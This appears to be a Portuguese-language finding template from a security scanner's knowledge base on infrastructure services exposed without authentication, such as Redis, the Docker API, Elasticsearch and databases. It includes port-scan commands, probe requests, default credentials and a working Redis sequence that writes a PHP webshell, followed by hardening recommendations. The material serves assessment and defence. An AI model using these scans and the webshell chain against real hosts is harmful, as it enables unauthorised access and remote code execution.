---
id: infrastructure_exposure
title: "Exposed Infrastructure Service"
module: "infra"
severity: "CRITICAL"
cwe_id: "CWE-284"
cwe_title: "Improper Access Control"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
vrt_id: "server_security_misconfiguration.exposed_admin_interface"
---

## Summary
Serviços de infraestrutura (Redis, Docker API, Elasticsearch, bancos, painéis administrativos) expostos à internet sem autenticação permitem leitura de dados, alteração de configuração e, frequentemente, execução remota de código.

## Description
O módulo de infraestrutura procura portas comuns e faz fingerprint de serviços que não deveriam estar públicos. Exemplos de alto impacto:

- **Redis (6379):** sem `requirepass`, permite `CONFIG SET dir/dbfilename` e escrita de webshell/cron, levando a RCE.
- **Docker API (2375/2376):** sem TLS/auth, permite criar containers privilegiados e montar o host, resultando em RCE.
- **Elasticsearch (9200/9300):** índices abertos, dados sensíveis, scripts habilitados podem levar a RCE.
- **Kibana (5601):** painel sem auth, acesso a dados e possível RCE via versões vulneráveis.
- **MongoDB (27017), MySQL (3306), PostgreSQL (5432), MSSQL (1433):** bancos expostos com credenciais fracas ou sem auth.
- **Memcached (11211):** dados em cache, amplificação DDoS.
- **Portainer (9000/9443), Coolify, Prometheus (9090), Grafana (3000), Consul (8500), etcd (2379):** painéis administrativos expostos.
- **SSH (22), FTP (21), Telnet (23), SMB (445):** credenciais fracas, protocolos legados, ransomware.
- **Actuator/Spring (8080/8443):** endpoints sensíveis (ver finding específico).

A exposição pode ser intencional (serviço público) ou acidental (security group aberto, bind `0.0.0.0`, falta de firewall). O scanner deve confirmar o serviço, versão e ausência de autenticação antes de reportar.

## Impact
- RCE no host/container e comprometimento total do ambiente.
- Dump/alteração de bancos e dados de usuários.
- Roubo de credenciais e movimento lateral.
- Ransomware, criptomineração e uso do host como botnet.
- Exfiltração de backups e segredos.
- Impacto CRITICAL.

## Payloads and Bypasses
```bash
# Descoberta
nmap -sV -p 21,22,23,25,80,443,445,1433,1521,2375,2376,3000,3306,5432,5601,6379,8080,8443,9000,9090,9200,9300,11211,27017 alvo.com
nmap -sS -O -p- --min-rate 1000 alvo.com   # quando autorizado e root
masscan -p1-65535 --rate=1000 alvo.com

# Redis sem auth
redis-cli -h alvo.com -p 6379 INFO
redis-cli -h alvo.com -p 6379 CONFIG GET dir
redis-cli -h alvo.com -p 6379 CONFIG SET dir /var/www/html
redis-cli -h alvo.com -p 6379 CONFIG SET dbfilename shell.php
redis-cli -h alvo.com -p 6379 SET x '<?php system($_GET[c]); ?>'
redis-cli -h alvo.com -p 6379 SAVE

# Docker API
curl -s http://alvo.com:2375/version
curl -s http://alvo.com:2375/containers/json
curl -s http://alvo.com:2375/images/json

# Elasticsearch
curl -s http://alvo.com:9200/
curl -s http://alvo.com:9200/_cat/indices?v
curl -s http://alvo.com:9200/_search?q=password

# Kibana / Grafana / Prometheus / Portainer
curl -s http://alvo.com:5601/
curl -s http://alvo.com:3000/api/health
curl -s http://alvo.com:9090/-/healthy
curl -s http://alvo.com:9000/api/status

# Bancos
mysql -h alvo.com -u root -p
psql -h alvo.com -U postgres
mongosh "mongodb://alvo.com:27017"

# Memcached
echo -e "stats\r\n" | nc alvo.com 11211
```

Bypasses/observações:
```text
- Portas altas e não padronizadas (6380, 9201, 2377)
- TLS em portas de management (9443) com certificado self-signed
- Serviços acessíveis apenas via IPv6
- Rate limit/firewall que bloqueia nmap, mas libera HTTP
- Vhosts internos que expõem painéis
- SSRF para alcançar serviços internos (combinar com finding SSRF)
- Credenciais default (admin/admin, elastic/changeme, redis/redis)
```

Casos reais e mentalidade de ataque (RWBH): o padrão é usar SSRF ou scan direto para alcançar Redis/Docker/Elasticsearch sem auth; o atacante confirma o serviço, tenta credenciais default e busca escrita em filesystem/cron para RCE.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** não se aplica (portas/serviços); testar credenciais default e headers de auth.
- **Portas comuns:** 21, 22, 23, 25, 80, 443, 445, 1433, 1521, 2375, 2376, 3000, 3306, 5432, 5601, 6379, 8080, 8443, 8500, 9000, 9090, 9200, 9300, 11211, 27017.
- **Sinais:** banner com versão; ausência de auth; `0.0.0.0`; painel acessível; dados de índice; `CONFIG GET` aberto.

## Recommendation
1. Fechar portas de infraestrutura na internet; usar VPN, bastion host ou private link.
2. Bind em `127.0.0.1`/rede interna e aplicar security groups/firewall com least privilege.
3. Exigir autenticação forte e TLS em todos os serviços de management; desabilitar default credentials.
4. Redis: `requirepass` forte, `protected-mode yes`, bind interno, renomear/desabilitar comandos perigosos (`CONFIG`, `FLUSHALL`, `EVAL`).
5. Docker API: usar TLS mútuo, nunca expor 2375; restringir a socket local.
6. Elasticsearch/Kibana: habilitar Security, RBAC, TLS e não expor índices publicamente.
7. Bancos: autenticação forte, TLS, sem usuário `root` remoto, auditoria e backup seguro.
8. Atualizar serviços e remover painéis legados; usar SSO/MFA em Portainer, Grafana, Prometheus e Coolify.
9. Monitorar scans, tentativas de auth e comandos perigosos; alertar e bloquear.
10. Se houver exposição, rotacionar credenciais, revisar logs e assumir comprometimento.
